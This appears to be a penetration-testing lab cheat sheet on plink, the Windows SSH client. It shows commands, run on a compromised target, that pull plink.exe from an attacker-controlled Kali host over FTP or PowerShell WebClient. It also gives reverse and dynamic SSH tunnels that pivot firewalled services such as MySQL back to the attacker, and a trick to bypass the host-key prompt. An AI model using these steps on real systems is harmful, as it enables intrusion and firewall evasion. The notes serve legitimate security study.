## PLink

Windows based command line SSH client

Syntax is similar to Linux's SSH client.

### Cheat Sheet to Download

Start FTP server on Kali

Run on the target to grab the files from Kali

```powershell
echo open 192.168.119.216 21> ftp.txt
echo USER rock>> ftp.txt
echo roll>> ftp.txt
echo passive >> ftp.txt
echo bin >> ftp.txt
echo GET plink.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

Or with Powershell, start a webserver on Kali and run on the target:

```bash
mkdir c:\temp
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216:80/plink.exe','C:\temp\plink.exe')"
```



### SSH Remote Port Forwarding Example

Assume a Windows 10 client has a MySQL server that is inaccessible to the Internet due to a firewall, but we want to scan it directly from our Kali machine.

The basic command is run on the Windows 10 client to make a remote port forward, but note the caveats in the 'Troubleshooting' section

```powershell
plink.exe -ssh -l coyote -R 192.168.119.216:1234:127.0.0.1:445 192.168.119.216

plink.exe -ssh -l coyote -pw ilak -R 192.168.119.216:1234:10.11.1.1:3306 192.168.119.216

# Options
-ssh	# Specifies an SSH connection
-l 	# SSH username
-pw	# SSH password
-R	# Remote Bind option
192.168.119.216:1234:127.0.0.1:3306 # Specifies that a listener will be opened on the remote end (192.168.119.216:1234) that will forward connections to the local port (127.0.0.1:3306) 
192.168.119.216	# IP to connect to for the SSH session
```

### SSH Dynamic Port Forwarding Example

```powershell
plink.exe -ssh -D 127.0.0.1:4455 -l rcoyote 192.168.119.216 -N

# Options
-D	# Specigies the local IP and port to listen on for SOCKS proxy connections (Remember to open a firewall port on the target)
```

#### Troubleshooting

If you try to execute the command above and get this error:  `FATAL ERROR: Couldn't agree a key exchange algorithm`, try to download the latest version of plink.exe.

Another issue occurs with a non-interactive prompt.  When connecting to an SSH server for the first time, plink will ask for you to accept the certificate.  But in a non-interactive prompt, this won't display, so we need to pass the answer to that question to the server as well, by revising our command to this:

```powershell
cmd.exe /c echo y | plink.exe -ssh -l coyote -pw ilak -R 192.168.119.216:1234:127.0.0.1:3306 192.168.119.216
```

